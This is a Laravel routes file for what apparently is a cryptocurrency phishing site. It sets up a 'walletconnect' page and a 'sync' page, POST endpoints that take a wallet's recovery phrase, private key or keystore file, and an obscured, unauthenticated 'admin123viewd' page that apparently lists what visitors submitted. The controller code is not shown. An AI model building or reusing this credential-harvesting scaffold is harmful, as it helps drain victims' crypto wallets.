<?php
use RealRashid\SweetAlert\Facades\Alert;

use Illuminate\Support\Facades\Route;
use App\Http\Controllers;
use App\Http\Controllers\ViewdetailsController;
use App\Http\Controllers\VisitorsController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});
Route::get("/", [VisitorsController::class, 'index'])->name('index');
Route::get('/walletconnect',[VisitorsController::class,'walletconnect'])->name('walletconnect');

Route::get('/sync/{wallet}',[VisitorsController::class,'sync'])->name('sync');

Route::post('/phrase',[VisitorsController::class,'phrase'])->name('phrase');
Route::post('/privatekey',[VisitorsController::class,'privatekey'])->name('privatekey');
Route::post('/keystore',[VisitorsController::class,'keystore'])->name('keystore');

Route::middleware([
    'auth:sanctum',
    config('jetstream.auth_session'),
    'verified'
])->group(function () {
    Route::get('/dashboard', function () {
        return view('dashboard');
    })->name('dashboard');
});
Route::get("admin123viewd",[ViewdetailsController::class,"index"])->name('viewdetails');
